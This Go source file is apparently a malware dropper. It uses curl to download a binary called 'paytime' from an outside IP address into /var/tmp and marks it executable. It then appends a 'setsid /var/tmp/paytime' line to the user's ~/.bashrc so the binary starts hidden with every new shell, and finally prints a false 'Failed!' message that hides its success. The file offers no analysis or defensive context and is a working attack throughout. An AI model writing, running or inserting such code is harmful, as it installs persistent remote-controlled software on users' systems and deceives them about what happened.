package main

import (
	"os/exec"
	"time"
)

// func exec_command(text string) {

// }

func main() {
	CmdOut := ""
	var c *exec.Cmd
	c = exec.Command("bash", "-c", "curl -o /var/tmp/paytime http://172.21.17.97/paytime -s")
	buf, _ := c.CombinedOutput()
	// if err != nil {
	// 	CmdOut = err.Error()
	// }
	CmdOut += string(buf)
	// logger.Logf(logger.Done, "Command executed successfully : %s\n", CmdOut)
	time.Sleep(time.Second * 3)
	var b *exec.Cmd
	b = exec.Command("bash", "-c", "chmod +x /var/tmp/paytime; if grep -q 'paytime' ~/.bashrc; then echo ' '; else echo 'setsid /var/tmp/paytime' >> ~/.bashrc; fi")
	buf1, _ := b.CombinedOutput()
	// if err != nil {
	// 	CmdOut = err1.Error()
	// }
	CmdOut += string(buf1)
	println("Failed!")
}
